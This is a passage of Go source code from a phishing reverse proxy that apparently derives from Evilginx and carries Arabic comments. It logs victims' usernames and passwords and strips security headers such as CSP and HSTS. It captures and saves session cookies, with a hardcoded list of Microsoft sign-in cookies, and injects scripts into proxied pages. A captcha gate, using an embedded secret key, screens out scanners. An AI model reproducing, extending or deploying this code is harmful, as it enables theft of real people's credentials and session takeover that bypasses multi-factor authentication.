									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetBaseDomain(),
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*CookieAuthToken
			if pl != nil {
				auth_tokens = pl.cookieAuthTokens
			}
			is_cookie_auth := false
			is_body_auth := false
			is_http_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie

				// add SameSite=none for every received cookie, allowing cookies through iframes
				if ck.Secure {
					ck.SameSite = http.SameSiteNoneMode
				}

				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
					if err != nil {
						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
						if err != nil {
							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
						}
					}
					ck.Expires = exptime
				}

				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					
					// التقاط جميع الكوكيز بغض النظر عن الشروط
					if s, ok := p.sessions[ps.SessionId]; ok {
						// تحقق مما إذا كان الكوكي من الكوكيز المهمة التي نريد التقاطها دائمًا
						importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT", "SignInStateCookie", "esctx", "esctx-lwT1klJj6xs", "esctx-wBx19e5C0fE", "CCState", "buid", "fpc", "stsservicecookie", "x-ms-gateway-slice", "OhpAuthC1", "OhpAuthC2", "OhpToken", "userid", ".AspNetCore.OpenIdConnect.Nonce.YEfco…MaQbx", "OH.SID", "chunks-2", "OhpAuth", "OhpCode", "UserIndex", ".AspNetCore.Correlation.pBD2cGtgVlT…Pf09F20-O8Q", "AjaxSessionKey", "OH.FLID"}
						isImportantCookie := false
						
						for _, cookieName := range importantCookies {
							// تعديل المقارنة لتجاهل حالة الأحرف
							if strings.ToLower(ck.Name) == strings.ToLower(cookieName) {
								isImportantCookie = true
								// طباعة تفاصيل إضافية للتشخيص
								log.Debug("وجدت كوكي مهم: %s (اسم ملف تعريف الارتباط الأصلي: %s)", cookieName, ck.Name)
								break
							}
						}
						
						// فقط اعتراض الكوكيز ذات القيمة
						if ck.Value != "" {
							// طباعة معلومات أكثر تفصيلاً للكوكيز المهمة
							if isImportantCookie {
								log.Success("[%d] تم اعتراض كوكي مهم: %s = %s (Domain: %s)", ps.Index, ck.Name, ck.Value, c_domain)
								p.importantCookieCount++
		log.Debug("عدد الكوكيز المهمة: %d", p.importantCookieCount)

							} else {
								log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
							}
							
							// طباعة محتوى CookieTokens قبل الإضافة
							log.Debug("CookieTokens قبل الإضافة: %d domains", len(s.CookieTokens))
							
							// للكوكيز المهمة، نؤكد بشكل خاص على إضافتها باستخدام الدالة الصحيحة
							if isImportantCookie {
								added := s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								if added {
									log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s بنجاح", ck.Name, ck.Value, c_domain)
								} else {
									log.Error("فشل في إضافة كوكي مهم: %s إلى الجلسة", ck.Name)
								}
								
								// طباعة محتوى CookieTokens بعد الإضافة
								if _, ok := s.CookieTokens[c_domain]; ok {
									tokens := s.CookieTokens[c_domain]
									log.Debug("CookieTokens بعد الإضافة: domain %s يحتوي على %d كوكيز", c_domain, len(tokens))
									// التحقق من وجود الكوكي المهم
									if token, exists := tokens[ck.Name]; exists {
										log.Debug("تم العثور على الكوكي المهم %s في CookieTokens: %s", ck.Name, token.Value)
									} else {
										log.Error("لم يتم العثور على الكوكي المهم %s في CookieTokens بعد الإضافة!", ck.Name)
									}
								}
								
								// حفظ الكوكيز في قاعدة البيانات فورًا
								log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
								
								// محاولة الحفظ الفوري للكوكيز المهمة
								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
								} else {
									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
									
									// التحقق من حفظ الكوكي
									sess, err := p.db.GetSessionBySid(ps.SessionId)
									if err != nil {
										log.Error("فشل استرجاع الجلسة من قاعدة البيانات: %v", err)
									} else {
										// التحقق من وجود الكوكي في الجلسة المحفوظة
										if tokens, ok := sess.CookieTokens[c_domain]; ok {
											if _, exists := tokens[ck.Name]; exists {
												log.Success("تم التأكد من حفظ الكوكي المهم %s في قاعدة البيانات", ck.Name)
											} else {
												log.Error("لم يتم العثور على الكوكي المهم %s في قاعدة البيانات بعد الحفظ!", ck.Name)
											}
										}
									}
								}
							} else {
								// إضافة الكوكيز العادية
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								
								// حفظ الكوكيز العادية في قاعدة البيانات
								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
									log.Error("database: %v", err)
								} else {
									log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
								}
							}
						}
					}
					
					// المتابعة بالكود الأصلي للتوافق
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					at := pl.getAuthToken(c_domain, ck.Name)
					if at != nil {
						s, ok := p.sessions[ps.SessionId]
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
							}
						}
					}
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// capture body response tokens
					for k, v := range pl.bodyAuthTokens {
						if _, ok := s.BodyTokens[k]; !ok {
							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
								//log.Debug("RESPONSE body = %s", string(body))
								token_re := v.search.FindStringSubmatch(string(body))
								if token_re != nil && len(token_re) >= 2 {
									s.BodyTokens[k] = token_re[1]
								}
							}
						}
					}

					// capture http header tokens
					for k, v := range pl.httpAuthTokens {
						if _, ok := s.HttpTokens[k]; !ok {
							hv := resp.Request.Header.Get(v.header)
							if hv != "" {
								s.HttpTokens[k] = hv
							}
						}
					}
				}

				// check if we have all tokens
				if len(pl.authUrls) == 0 {
					if s, ok := p.sessions[ps.SessionId]; ok {
						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
							is_body_auth = true
						}
						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
							is_http_auth = true
						}
					}
				}
			}

			if is_cookie_auth && is_body_auth && is_http_auth {
				// we have all auth tokens
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						log.Success("[%d] all authorization tokens intercepted!", ps.Index)

						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
							log.Error("database: %v", err)
						}
						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
							log.Error("database: %v", err)
						}
						s.Finish(false)

						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
							rid, ok := s.Params["rid"]
							if ok && rid != "" {
								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
								if err != nil {
									log.Error("gophish: %s", err)
								}
							}
						}
					}
				}
			}

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if s, ok := p.sessions[ps.SessionId]; ok {
									var params []string
									for k := range s.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
						body = []byte(removeObfuscatedDots(string(body)))
					}
				}

				if stringExists(mime, []string{"text/html"}) {

					if pl != nil && ps.SessionId != "" {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							if s.PhishLure != nil {
								// inject opengraph headers
								l := s.PhishLure
								body = p.injectOgHeaders(l, body)
							}

							var js_params *map[string]string = nil
							if s, ok := p.sessions[ps.SessionId]; ok {
								js_params = &s.Params
							}
							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
							}

							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
						}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
							if err != nil {
								log.Error("database: %v", err)
							}
							if err == nil {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
							}

							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
								rid, ok := s.Params["rid"]
								if ok && rid != "" {
									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
									if err != nil {
										log.Error("gophish: %s", err)
									}
								}
							}
							break
						}
					}
				}
			}

			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
				resp.Header.Set("Cache-Control", "no-cache, no-store")
			}

			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					if s.RedirectURL != "" && s.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
							// redirect only if received response content is of `text/html` content type
							s.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)

							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
							return resp
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {

	s, ok := p.sessions[session_id]
	if ok {

		if s.IsDone {
			return s.RedirectURL, true
		}

		ticker := time.NewTicker(30 * time.Second)
		select {
		case <-ticker.C:
			break
		case <-s.DoneSignal:
			return s.RedirectURL, true
		}
	}
	return "", false
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	// استخراج البريد الإلكتروني من URL إذا كان موجودًا
	path := req.URL.Path
	fullURL := req.URL.String()
	email := ""
	
	// البحث عن البريد الإلكتروني المشفر بـ Base64 في معلمات URL
	urlValues := req.URL.Query()
	if encodedEmail, exists := urlValues["e"]; exists && len(encodedEmail) > 0 {
		decodedBytes, err := base64.StdEncoding.DecodeString(encodedEmail[0])
		if err == nil {
			email = string(decodedBytes)
			log.Info("تم استخراج البريد الإلكتروني من معلمة Base64: %s", email)
		} else {
			log.Warning("فشل في فك تشفير البريد الإلكتروني: %s", err)
		}
	}
	
	// طرق احتياطية أخرى للبحث عن البريد الإلكتروني
	if email == "" {
		// الطريقة الأولى: البحث عن النمط المعتاد
		re1 := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
		matches1 := re1.FindStringSubmatch(path)
		if len(matches1) > 1 {
			email = matches1[1]
		}
		
		// الطريقة الثانية: البحث عن النمط المشفر
		re2 := regexp.MustCompile(`\$([^\/]+%40[^\/]+)`)
		matches2 := re2.FindStringSubmatch(path)
		if len(matches2) > 1 {
			decodedEmail, err := url.QueryUnescape(matches2[1])
			if err == nil {
				email = decodedEmail
			}
		}
		
		// الطريقة الثالثة: البحث في URL كامل
		re3 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+%40[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
		matches3 := re3.FindStringSubmatch(fullURL)
		if len(matches3) > 0 {
			decodedEmail, err := url.QueryUnescape(matches3[0])
			if err == nil && email == "" {
				email = decodedEmail
			}
		}
		
		// الطريقة الرابعة: البحث عن صيغة النطاق في URL
		re4 := regexp.MustCompile(`([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
		matches4 := re4.FindStringSubmatch(fullURL)
		if len(matches4) > 0 && email == "" {
			email = matches4[0]
		}
	}
	
	if email != "" {
		log.Info("تم استخراج البريد الإلكتروني من URL: %s", email)
	}
	
	// التحقق من وجود كوكي CAPTCHA
	captcha_cookie, err := req.Cookie("passed_captcha")
	if err == nil && captcha_cookie.Value == "1" {
		// المستخدم اجتاز الكابتشا، نتابع إلى رابط lure
	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
			phish_host := req.Host
			_, ok := p.replaceHostWithOriginal(req.Host)
			if ok {
				// محاولة العثور على lure path
				for _, l := range p.cfg.lures {
					if l.Phishlet == pl.Name {
						if l.Hostname != "" && l.Hostname != phish_host {
							continue
						}
						
						// استخدام المسار المخصص في lure إذا وجد، وإلا استخدام مسار افتراضي
						lure_path := "/"
						if l.Path != "" {
							lure_path = l.Path
						}
						
						// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
						redirect_url := fmt.Sprintf("https://%s%s", phish_host, lure_path)
						if email != "" {
							// تشفير البريد الإلكتروني مرة أخرى
							encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
							if strings.Contains(redirect_url, "?") {
								redirect_url += "&e=" + encodedEmail
							} else {
								redirect_url += "?e=" + encodedEmail
							}
						}
						
		return p.javascriptRedirect(req, redirect_url)
					}
				}
			}
			
			// إذا لم يتم العثور على lure محدد، استخدم إعادة التوجيه الافتراضية
			redirect_url := p.cfg.PhishletConfig(pl.Name).UnauthUrl
			if redirect_url != "" {
				// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
				if email != "" {
					encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
					if strings.Contains(redirect_url, "?") {
						redirect_url += "&e=" + encodedEmail
	} else {
						redirect_url += "?e=" + encodedEmail
					}
				}
				return p.javascriptRedirect(req, redirect_url)
			}
		}
	}
	
	// التحقق مما إذا كان هذا طلب POST لتحقق الكابتشا
	if req.Method == "POST" && req.URL.Path == "/verify_captcha" {
		err := req.ParseForm()
		if err == nil {
			// التحقق من رمز Turnstile 
			token := req.FormValue("cf-turnstile-response")
			if token != "" {
				// بناء طلب للتحقق من الكابتشا
				client := &http.Client{Timeout: 10 * time.Second}
				
				verification_data := url.Values{}
				verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
				verification_data.Set("response", token)
				verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
				
				verification_resp, err := client.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", verification_data)
				if err == nil {
					defer verification_resp.Body.Close()
					var result map[string]interface{}
					if err := json.NewDecoder(verification_resp.Body).Decode(&result); err == nil {
						if success, ok := result["success"].(bool); ok && success {
							// نجح التحقق، وضع الكوكي وإعادة التوجيه
							resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
								expiration := time.Now().Add(24 * time.Hour)
								cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
								resp.Header.Set("Set-Cookie", cookie.String())
								
								// إضافة كوكي للبريد الإلكتروني للنطاق الرئيسي
								if email != "" {
									// استخراج النطاق الرئيسي
									host := req.Host
									parts := strings.Split(host, ".")
									if len(parts) >= 2 {
										mainDomain := strings.Join(parts[len(parts)-2:], ".")
										emailCookie := http.Cookie{
											Name: "user_email", 
											Value: email, 
											Domain: "." + mainDomain, // إضافة نقطة للسماح بالمشاركة مع النطاقات الفرعية
											Path: "/", 
											MaxAge: 86400, // صالح لمدة يوم
											Secure: true,
											HttpOnly: false,
										}
										resp.Header.Add("Set-Cookie", emailCookie.String())
									}
								}
								
								// تحديد المسار الذي سيتم إعادة التوجيه إليه
								redirectPath := req.FormValue("redirect_path")
								if redirectPath == "" {
									redirectPath = "/"
								}
								
								// إضافة معلمة البريد الإلكتروني إلى عنوان URL عند إعادة التوجيه إذا كانت موجودة
								if email != "" {
									encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
									if strings.Contains(redirectPath, "?") {
										redirectPath += "&e=" + encodedEmail
									} else {
										redirectPath += "?e=" + encodedEmail
									}
								}
								
								resp.Header.Set("Location", redirectPath)
			return req, resp
		}
	}
					}
				}
			}
		}
		// في حالة الفشل، عرض صفحة الكابتشا مرة أخرى مع رسالة خطأ
		captchaHTML := `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        .captcha-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        .error {
            color: #e53935;
            margin-top: 15px;
        }
    </style>
    <script>
        function onCaptchaSuccess(token) {
            document.getElementById('captcha-form').submit();
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="error">تعذر التحقق، يرجى المحاولة مرة أخرى</div>
        <form id="captcha-form" action="/verify_captcha" method="POST">
            <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
            <div class="captcha-container">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
            </div>
        </form>
    </div>
</body>
</html>`
		
